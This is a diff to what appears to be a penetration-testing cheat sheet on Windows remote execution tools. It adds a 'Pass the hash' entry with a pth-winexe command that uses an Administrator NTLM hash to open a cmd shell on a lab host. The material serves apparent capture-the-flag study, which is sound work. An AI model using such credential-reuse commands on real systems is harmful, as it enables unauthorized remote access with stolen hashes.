@@ -66,6 +66,13 @@ sc \\machine start serviceName
 ### Winexe
 - https://sourceforge.net/projects/winexe/
 
+#### Pass the hash
+```
+pth-winexe
+-U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+//10.10.10.63 cmd
+```
+
 ### wmiexec.py
 - Windows Management Instrumentation (WMI) to launch a semi-interactive shell.
 - WMI is the infrastructure for management data and operations on Windows (like SNMP).
